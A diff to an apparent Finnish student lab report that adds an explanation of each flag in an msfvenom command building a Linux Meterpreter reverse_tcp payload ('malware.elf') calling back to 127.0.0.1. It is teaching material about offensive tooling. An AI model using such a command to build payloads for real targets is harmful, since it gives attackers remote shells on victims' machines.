@@ -329,6 +329,13 @@ Tämän jälkeen ajoin komennon, jolla voi luoda haittaohjelman [dokumentaation]
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8 -f elf -o malware.elf
 ```
 
+```msfvenom``` = Ajettava ohjelma    
+```-p linux/x64/meterpreter/reverse_tcp``` = Payloadin tyyppi, tässä tapauksessa reverse tcp Linuxille.     
+```LHOST=127.0.0.1``` = IP, johon saastunut kone yhdistää    
+```LPORT=8``` = Portti, johon saastunut kone käyttää     
+```-f elf``` = Luodun haittaohjelman tiedostoformaatti    
+```-o malware.elf``` = Luodun haittaohjelman nimi    
+
 <img src="https://github.com/user-attachments/assets/86710d46-8716-469f-bc3d-65741bf82ecd" width="500"> <br/>
 
 
